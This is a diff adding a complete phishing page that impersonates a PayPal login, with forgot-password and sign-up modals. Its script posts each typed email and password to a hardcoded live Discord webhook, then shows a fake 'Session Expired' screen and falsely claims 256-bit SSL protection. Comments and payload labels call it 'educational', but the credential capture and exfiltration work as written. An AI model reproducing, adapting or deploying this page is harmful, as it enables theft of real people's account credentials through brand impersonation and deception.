@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PayPal · Login</title>
+  <!-- Font Awesome 5 (free) -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" />
+  <!-- Google Font (Inter) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #e9eef2;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1.5rem;
+    }
+
+    .paypal-card {
+      max-width: 420px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 2.2rem 2rem 2.5rem;
+      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.02);
+      transition: box-shadow 0.2s;
+    }
+
+    .paypal-card:hover {
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.10);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 1.8rem;
+    }
+
+    .brand i {
+      font-size: 2.2rem;
+      color: #003087;
+    }
+
+    .brand h1 {
+      font-weight: 600;
+      font-size: 1.9rem;
+      letter-spacing: -0.5px;
+      color: #003087;
+    }
+
+    .brand h1 span {
+      font-weight: 300;
+      color: #009cde;
+    }
+
+    .subhead {
+      font-size: 0.95rem;
+      color: #2c3e50;
+      margin-bottom: 2rem;
+      border-bottom: 1px solid #e4e9ed;
+      padding-bottom: 0.9rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .subhead small {
+      color: #6c7a8a;
+      font-weight: 400;
+      font-size: 0.85rem;
+    }
+
+    .subhead i {
+      color: #009cde;
+      margin-right: 4px;
+    }
+
+    .form-group {
+      margin-bottom: 1.4rem;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #1a2634;
+      margin-bottom: 5px;
+      letter-spacing: -0.2px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+      background: #f7f9fa;
+      border: 1px solid #d9e0e6;
+      border-radius: 6px;
+      transition: 0.15s ease;
+    }
+
+    .input-wrapper:focus-within {
+      border-color: #0070ba;
+      box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.15);
+      background: #ffffff;
+    }
+
+    .input-wrapper i {
+      color: #8b9aaa;
+      font-size: 0.95rem;
+      padding: 0 0 0 14px;
+      width: 2.2rem;
+      text-align: center;
+    }
+
+    .input-wrapper input {
+      width: 100%;
+      border: none;
+      background: transparent;
+      padding: 0.8rem 1rem 0.8rem 0.2rem;
+      font-size: 0.95rem;
+      font-family: 'Inter', sans-serif;
+      font-weight: 400;
+      color: #1a2634;
+      outline: none;
+    }
+
+    .input-wrapper input::placeholder {
+      color: #9aabba;
+      font-weight: 400;
+      font-size: 0.9rem;
+    }
+
+    .row-options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 1.2rem 0 1.8rem;
+      font-size: 0.9rem;
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #2c3e50;
+      cursor: pointer;
+    }
+
+    .remember-me input[type="checkbox"] {
+      accent-color: #0070ba;
+      width: 16px;
+      height: 16px;
+      margin: 0;
+      cursor: pointer;
+    }
+
+    .forgot-link {
+      color: #0070ba;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 0.85rem;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 0;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    .login-btn {
+      background: #0070ba;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 0.9rem 0;
+      width: 100%;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      letter-spacing: 0.3px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      margin-top: 0.4rem;
+      box-shadow: 0 2px 6px rgba(0, 112, 186, 0.2);
+    }
+
+    .login-btn i {
+      font-size: 0.9rem;
+    }
+
+    .login-btn:hover {
+      background: #005ea6;
+    }
+
+    .login-btn:active {
+      transform: scale(0.97);
+    }
+
+    .signup-section {
+      margin-top: 2.2rem;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #2c3e50;
+    }
+
+    .signup-section a {
+      color: #0070ba;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .signup-section a:hover {
+      text-decoration: underline;
+    }
+
+    .legal {
+      margin-top: 1.2rem;
+      font-size: 0.7rem;
+      color: #7b8b9e;
+      text-align: center;
+      border-top: 1px solid #e4e9ed;
+      padding-top: 1.4rem;
+      letter-spacing: 0.2px;
+    }
+
+    .legal i {
+      color: #cbd5e0;
+      margin: 0 4px;
+    }
+
+    /* ----- modal / overlay for forgot & signup ----- */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: blur(4px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      padding: 1.5rem;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.2s, opacity 0.2s;
+    }
+
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .modal-box {
+      background: white;
+      border-radius: 16px;
+      max-width: 380px;
+      width: 100%;
+      padding: 2rem 1.8rem 2rem;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+      position: relative;
+      transform: scale(0.95);
+      transition: transform 0.2s;
+    }
+
+    .modal-overlay.active .modal-box {
+      transform: scale(1);
+    }
+
+    .modal-box .close-modal {
+      position: absolute;
+      top: 14px;
+      right: 18px;
+      font-size: 1.2rem;
+      color: #8b9aaa;
+      background: none;
+      border: none;
+      cursor: pointer;
+      transition: 0.15s;
+    }
+
+    .modal-box .close-modal:hover {
+      color: #1a2634;
+    }
+
+    .modal-box h3 {
+      font-weight: 600;
+      font-size: 1.3rem;
+      color: #003087;
+      margin-bottom: 0.8rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .modal-box p {
+      color: #2c3e50;
+      font-size: 0.95rem;
+      line-height: 1.5;
+      margin-bottom: 1.2rem;
+    }
+
+    .modal-box .error-message {
+      background: #fef1f0;
+      border-left: 4px solid #d32f2f;
+      padding: 0.8rem 1rem;
+      border-radius: 6px;
+      color: #b71c1c;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .modal-box .error-message i {
+      font-size: 1.2rem;
+      color: #d32f2f;
+    }
+
+    .modal-box .btn-secondary {
+      background: #e4e9ed;
+      color: #1a2634;
+      border: none;
+      padding: 0.7rem 1.8rem;
+      border-radius: 30px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.15s;
+      margin-top: 1.2rem;
+      width: 100%;
+    }
+
+    .modal-box .btn-secondary:hover {
+      background: #d0d7de;
+    }
+
+    .signup-modal .input-wrapper {
+      margin-bottom: 0.8rem;
+    }
+
+    .signup-modal .input-wrapper:last-of-type {
+      margin-bottom: 1.2rem;
+    }
+
+    .signup-modal .btn-primary {
+      background: #0070ba;
+      color: white;
+      border: none;
+      padding: 0.75rem;
+      border-radius: 30px;
+      font-weight: 600;
+      font-size: 0.95rem;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.15s;
+    }
+
+    .signup-modal .btn-primary:hover {
+      background: #005ea6;
+    }
+
+    /* ----- EXPIRED PAGE (hidden by default) ----- */
+    .expired-page {
+      display: none;
+      max-width: 420px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 2.5rem 2rem;
+      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+
+    .expired-page.active {
+      display: block;
+    }
+
+    .expired-page .icon-circle {
+      font-size: 4rem;
+      color: #d32f2f;
+      margin-bottom: 1.2rem;
+    }
+
+    .expired-page h2 {
+      color: #1a2634;
+      font-weight: 600;
+      font-size: 1.6rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .expired-page p {
+      color: #5a6a7a;
+      font-size: 0.95rem;
+      line-height: 1.6;
+      margin-bottom: 0.5rem;
+    }
+
+    .expired-page .expired-detail {
+      background: #f7f9fa;
+      border-radius: 8px;
+      padding: 0.8rem 1rem;
+      margin: 1.2rem 0;
+      font-size: 0.85rem;
+      color: #2c3e50;
+      border: 1px solid #e4e9ed;
+    }
+
+    .expired-page .btn-expired {
+      background: #0070ba;
+      color: white;
+      border: none;
+      padding: 0.8rem 2rem;
+      border-radius: 30px;
+      font-weight: 600;
+      font-size: 0.95rem;
+      cursor: pointer;
+      transition: 0.15s;
+      margin-top: 0.8rem;
+    }
+
+    .expired-page .btn-expired:hover {
+      background: #005ea6;
+    }
+
+    .expired-page .legal-policy {
+      margin-top: 2rem;
+      font-size: 0.7rem;
+      color: #7b8b9e;
+      border-top: 1px solid #e4e9ed;
+      padding-top: 1.4rem;
+      line-height: 1.6;
+    }
+
+    .expired-page .legal-policy a {
+      color: #0070ba;
+      text-decoration: none;
+    }
+
+    .expired-page .legal-policy a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .paypal-card {
+        padding: 1.8rem 1.2rem 2rem;
+      }
+      .brand h1 {
+        font-size: 1.7rem;
+      }
+      .expired-page {
+        padding: 2rem 1.2rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- LOGIN CARD -->
+  <div class="paypal-card" id="loginCard">
+    <div class="brand">
+      <i class="fab fa-paypal"></i>
+      <h1>Pay<span>Pal</span></h1>
+    </div>
+
+    <div class="subhead">
+      <span><i class="fas fa-lock" style="color:#0070ba;"></i> Secure login</span>
+      <small><i class="fas fa-shield-alt"></i> encrypted</small>
+    </div>
+
+    <!-- login form -->
+    <form id="loginForm" action="#" method="POST">
+      <div class="form-group">
+        <label for="email"><i class="fas fa-envelope" style="margin-right:6px; color:#0070ba;"></i> Email or username</label>
+        <div class="input-wrapper">
+          <i class="fas fa-user-circle"></i>
+          <input type="text" id="email" name="email" placeholder="name@example.com" autocomplete="username" required>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="password"><i class="fas fa-key" style="margin-right:6px; color:#0070ba;"></i> Password</label>
+        <div class="input-wrapper">
+          <i class="fas fa-lock"></i>
+          <input type="password" id="password" name="password" placeholder="••••••••" autocomplete="current-password" required>
+        </div>
+      </div>
+
+      <div class="row-options">
+        <label class="remember-me">
+          <input type="checkbox" name="remember" checked> Keep me logged in
+        </label>
+        <button type="button" class="forgot-link" id="forgotBtn"><i class="fas fa-question-circle"></i> Forgot password?</button>
+      </div>
+
+      <button type="submit" class="login-btn" id="loginBtn">
+        <i class="fas fa-sign-in-alt"></i> Log In
+      </button>
+    </form>
+
+    <div class="signup-section">
+      <span>Don't have an account? </span>
+      <a id="signupTrigger">Sign up</a>
+    </div>
+
+    <div class="legal">
+      <i class="fas fa-shield-alt"></i> Protected by industry-standard encryption
+      <span style="display:inline-block; margin:0 8px;">•</span>
+      <i class="fas fa-lock"></i> 256-bit SSL
+    </div>
+  </div>
+
+  <!-- EXPIRED PAGE (hidden by default) -->
+  <div class="expired-page" id="expiredPage">
+    <div class="icon-circle">
+      <i class="fas fa-hourglass-end"></i>
+    </div>
+    <h2>Session Expired</h2>
+    <p>Your login session has expired or is no longer valid.</p>
+    <div class="expired-detail">
+      <i class="fas fa-info-circle" style="color:#0070ba; margin-right:6px;"></i>
+      For security reasons, your session was terminated. Please log in again to continue.
+    </div>
+    <button class="btn-expired" id="backToLoginBtn"><i class="fas fa-arrow-left"></i> Back to Login</button>
+
+    <!-- Policy, Terms & Conditions (instead of webhook indicator) -->
+    <div class="legal-policy">
+      <p><strong>Privacy Policy</strong> · <strong>Terms of Service</strong> · <strong>Cookie Policy</strong></p>
+      <p style="margin-top:0.5rem;">
+        By using this service, you agree to our 
+        <a href="#">Terms &amp; Conditions</a> and 
+        <a href="#">Privacy Policy</a>. All transactions are protected by 
+        industry-standard encryption.
+      </p>
+      <p style="margin-top:0.5rem; color:#9aabba;">
+        &copy; 2026 PayPal, Inc. All rights reserved.
+      </p>
+    </div>
+  </div>
+
+  <!-- MODAL: Forgot password (error) -->
+  <div class="modal-overlay" id="forgotModal">
+    <div class="modal-box">
+      <button class="close-modal" id="closeForgotModal"><i class="fas fa-times"></i></button>
+      <h3><i class="fas fa-key" style="color:#0070ba;"></i> Forgot password</h3>
+      <p>Enter your email and we'll send you a reset link.</p>
+      <div class="input-wrapper" style="margin-bottom:1.2rem;">
+        <i class="fas fa-envelope"></i>
+        <input type="email" id="forgotEmail" placeholder="your@email.com" />
+      </div>
+      <button class="btn-primary" id="forgotSubmitBtn" style="background:#0070ba;color:white;border:none;padding:0.75rem;border-radius:30px;font-weight:600;width:100%;cursor:pointer;">Send reset</button>
+      <div id="forgotErrorContainer" style="margin-top:1rem; display:none;">
+        <div class="error-message">
+          <i class="fas fa-exclamation-circle"></i>
+          <span id="forgotErrorText">We're sorry, we cannot process password reset at this time. Please try again later or contact support. (Error: PWR-003)</span>
+        </div>
+      </div>
+      <button class="btn-secondary" id="closeForgotBtn2">Close</button>
+    </div>
+  </div>
+
+  <!-- MODAL: Sign up (simple) -->
+  <div class="modal-overlay" id="signupModal">
+    <div class="modal-box signup-modal">
+      <button class="close-modal" id="closeSignupModal"><i class="fas fa-times"></i></button>
+      <h3><i class="fas fa-user-plus" style="color:#0070ba;"></i> Create account</h3>
+      <p>Join millions who trust PayPal.</p>
+      <div class="input-wrapper">
+        <i class="fas fa-envelope"></i>
+        <input type="email" id="signupEmail" placeholder="Email address" />
+      </div>
+      <div class="input-wrapper">
+        <i class="fas fa-lock"></i>
+        <input type="password" id="signupPassword" placeholder="Create password" />
+      </div>
+      <div class="input-wrapper">
+        <i class="fas fa-check-circle"></i>
+        <input type="password" id="signupConfirm" placeholder="Confirm password" />
+      </div>
+      <button class="btn-primary" id="signupSubmitBtn">Sign up</button>
+      <div id="signupMessage" style="margin-top:0.8rem;font-size:0.85rem;color:#2c3e50;text-align:center;"></div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ---------- Discord webhook (educational) ----------
+      const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1521555458543063080/umvwalhGaI415sbwIoghfJ1s3oAxpw6NVPa2AUvEXJc7K95z5gBYylvEqhPLgvD6ELQ2";
+
+      const loginCard = document.getElementById('loginCard');
+      const expiredPage = document.getElementById('expiredPage');
+      const backToLoginBtn = document.getElementById('backToLoginBtn');
+
+      function showExpiredPage() {
+        loginCard.style.display = 'none';
+        expiredPage.classList.add('active');
+      }
+
+      function showLoginPage() {
+        loginCard.style.display = 'block';
+        expiredPage.classList.remove('active');
+      }
+
+      backToLoginBtn.addEventListener('click', showLoginPage);
+
+      // ---------- Webhook sender ----------
+      async function sendToDiscord(payload) {
+        try {
+          console.log('📤 Sending webhook payload:', payload);
+          
+          const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+          });
+
+          console.log('📥 Webhook response status:', response.status);
+          
+          if (response.ok) {
+            console.log('✅ Webhook delivered successfully!');
+          } else {
+            const errorText = await response.text();
+            console.error('❌ Webhook error:', response.status, errorText);
+          }
+        } catch (error) {
+          console.error('❌ Webhook fetch error:', error);
+          console.log('📨 [EDUCATIONAL] Captured data (webhook failed):', payload);
+        }
+      }
+
+      // ---------- LOGIN ----------
+      const form = document.getElementById('loginForm');
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const remember = document.querySelector('input[name="remember"]').checked;
+
+        if (!email || !password) {
+          alert('Please fill in both fields.');
+          return;
+        }
+
+        const payload = {
+          username: "PayPal·Login (educational)",
+          avatar_url: "https://cdn-icons-png.flaticon.com/512/174/174861.png",
+          embeds: [{
+            title: "🔐 PayPal Login (educational demo)",
+            color: 0x0070ba,
+            fields: [
+              { name: "📧 Email / Username", value: email, inline: true },
+              { name: "🔑 Password", value: `||${password}||`, inline: true },
+              { name: "✅ Remember me", value: remember ? "Yes" : "No", inline: true },
+              { name: "🕒 Timestamp", value: new Date().toUTCString(), inline: false },
+              { name: "⚠️ Educational purpose only", value: "This is a simulated login – no real data is stored.", inline: false }
+            ],
+            footer: { text: "for educational & security awareness", icon_url: "https://cdn-icons-png.flaticon.com/512/174/174861.png" },
+            timestamp: new Date().toISOString()
+          }]
+        };
+        
+        sendToDiscord(payload);
+        showExpiredPage();
+      });
+
+      // ---------- FORGOT PASSWORD ----------
+      const forgotModal = document.getElementById('forgotModal');
+      const forgotBtn = document.getElementById('forgotBtn');
+      const closeForgotModal = document.getElementById('closeForgotModal');
+      const closeForgotBtn2 = document.getElementById('closeForgotBtn2');
+      const forgotSubmitBtn = document.getElementById('forgotSubmitBtn');
+      const forgotErrorContainer = document.getElementById('forgotErrorContainer');
+      const forgotErrorText = document.getElementById('forgotErrorText');
+
+      function openForgotModal() {
+        forgotModal.classList.add('active');
+        forgotErrorContainer.style.display = 'none';
+        document.getElementById('forgotEmail').value = '';
+      }
+
+      function closeForgotModalFn() {
+        forgotModal.classList.remove('active');
+      }
+
+      forgotBtn.addEventListener('click', openForgotModal);
+      closeForgotModal.addEventListener('click', closeForgotModalFn);
+      closeForgotBtn2.addEventListener('click', closeForgotModalFn);
+      forgotModal.addEventListener('click', function(e) {
+        if (e.target === forgotModal) closeForgotModalFn();
+      });
+
+      forgotSubmitBtn.addEventListener('click', function() {
+        const email = document.getElementById('forgotEmail').value.trim();
+        if (!email) {
+          forgotErrorText.innerText = 'Please enter your email address.';
+          forgotErrorContainer.style.display = 'flex';
+          return;
+        }
+        forgotErrorText.innerText = 'We cannot process password reset at this time. Please try again later or contact support. (Error: PWR-003)';
+        forgotErrorContainer.style.display = 'flex';
+
+        const payload = {
+          username: "PayPal·Forgot (educational)",
+          embeds: [{
+            title: "🔐 Forgot password attempt (educational)",
+            color: 0xe67e22,
+            fields: [
+              { name: "📧 Email", value: email, inline: true },
+              { name: "⚠️ Error", value: "Password reset disabled (simulated)", inline: false }
+            ],
+            footer: { text: "educational demo" },
+            timestamp: new Date().toISOString()
+          }]
+        };
+        sendToDiscord(payload);
+      });
+
+      // ---------- SIGN UP ----------
+      const signupModal = document.getElementById('signupModal');
+      const signupTrigger = document.getElementById('signupTrigger');
+      const closeSignupModal = document.getElementById('closeSignupModal');
+      const signupSubmitBtn = document.getElementById('signupSubmitBtn');
+      const signupMessage = document.getElementById('signupMessage');
+
+      function openSignupModal() {
+        signupModal.classList.add('active');
+        document.getElementById('signupEmail').value = '';
+        document.getElementById('signupPassword').value = '';
+        document.getElementById('signupConfirm').value = '';
+        signupMessage.innerHTML = '';
+      }
+
+      function closeSignupModalFn() {
+        signupModal.classList.remove('active');
+      }
+
+      signupTrigger.addEventListener('click', openSignupModal);
+      closeSignupModal.addEventListener('click', closeSignupModalFn);
+      signupModal.addEventListener('click', function(e) {
+        if (e.target === signupModal) closeSignupModalFn();
+      });
+
+      signupSubmitBtn.addEventListener('click', function() {
+        const email = document.getElementById('signupEmail').value.trim();
+        const pass = document.getElementById('signupPassword').value.trim();
+        const confirm = document.getElementById('signupConfirm').value.trim();
+
+        if (!email || !pass || !confirm) {
+          signupMessage.innerHTML = '<span style="color:#b22222;">⚠️ Please fill all fields.</span>';
+          return;
+        }
+        if (pass !== confirm) {
+          signupMessage.innerHTML = '<span style="color:#b22222;">⚠️ Passwords do not match.</span>';
+          return;
+        }
+        if (pass.length < 6) {
+          signupMessage.innerHTML = '<span style="color:#b22222;">⚠️ Password must be at least 6 characters.</span>';
+          return;
+        }
+
+        const payload = {
+          username: "PayPal·Signup (educational)",
+          embeds: [{
+            title: "📝 New account signup (educational)",
+            color: 0x2ecc71,
+            fields: [
+              { name: "📧 Email", value: email, inline: true },
+              { name: "🔑 Password", value: `||${pass}||`, inline: true },
+              { name: "📌 Status", value: "Signup simulated (no real account)", inline: false }
+            ],
+            footer: { text: "educational demo" },
+            timestamp: new Date().toISOString()
+          }]
+        };
+        
+        sendToDiscord(payload);
+        signupMessage.innerHTML = '<span style="color:#1a7a3a;">✅ Account created! Redirecting...</span>';
+        
+        setTimeout(() => {
+          closeSignupModalFn();
+          showExpiredPage();
+        }, 1200);
+      });
+
+      console.log('✅ PayPal login (educational) — webhook ready.');
+      console.log('🔗 Webhook URL:', DISCORD_WEBHOOK_URL);
+      console.log('📝 Open browser console (F12) to see webhook debug logs.');
+    })();
+  </script>
+</body>
+</html>
